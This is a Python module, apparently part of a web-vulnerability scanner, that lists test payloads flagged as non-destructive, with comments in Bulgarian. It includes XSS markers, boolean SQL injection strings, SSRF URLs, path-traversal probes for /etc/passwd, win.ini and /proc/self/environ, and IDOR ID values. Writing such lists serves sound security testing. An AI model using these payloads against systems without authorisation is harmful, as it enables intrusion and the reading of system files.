# payloads.py
# Централизирани (safe) payloads. По подразбиране destructive: False.
# Използвай placeholders (%s) за вмъкване на уникални маркери при runtime.

PAYLOADS = {
    "xss": [
        {"payload": "<svg>%s</svg>", "destructive": False, "description": "benign svg marker"},
        {"payload": "\"><svg/onload=console.log('%s')>", "destructive": False, "description": "attribute-contained benign marker"},
        {"payload": "<img src=x onerror=console.log('%s')>", "destructive": False, "description": "onerror attribute marker (non-executing in many contexts)"},
    ],
    "sql": [
        {"payload": "' OR '1'='1", "destructive": False, "description": "boolean SQL test (non-invasive)"},
        {"payload": "\" OR \"1\"=\"1", "destructive": False, "description": "alternative quote boolean test"},
        # Избягваме time-based payloads по подразбиране (опасни)
    ],
    "ssrf": [
        {"payload": "http://example.com/ping?u=%s", "destructive": False, "description": "external URL indicator (use your collaborator domain when available)"},
        {"payload": "http://127.0.0.1/%s", "destructive": False, "description": "local IP indicator (passive evidence)"},
    ],
    "lfi": [
        {"payload": "../../etc/passwd", "destructive": False, "description": "UNIX passwd probe"},
        {"payload": "../../../etc/passwd", "destructive": False, "description": "UNIX passwd deeper probe"},
        {"payload": "/etc/passwd", "destructive": False, "description": "absolute UNIX passwd probe"},
        {"payload": "../../../../windows/win.ini", "destructive": False, "description": "Windows win.ini probe"},
        {"payload": "../../../../../proc/self/environ", "destructive": False, "description": "proc environ probe (read-only)"},
    ],
    "other": [
        {"payload": "%s", "destructive": False, "description": "simple marker placeholder (generic)"},
    ],
    "idor": [
        {"payload": "1", "destructive": False, "description": "first object ID test"},
        {"payload": "999999", "destructive": False, "description": "high numeric ID test"},
        {"payload": "0", "destructive": False, "description": "zero ID edge case"},
        {"payload": "-1", "destructive": False, "description": "negative ID edge case"},
    ]
}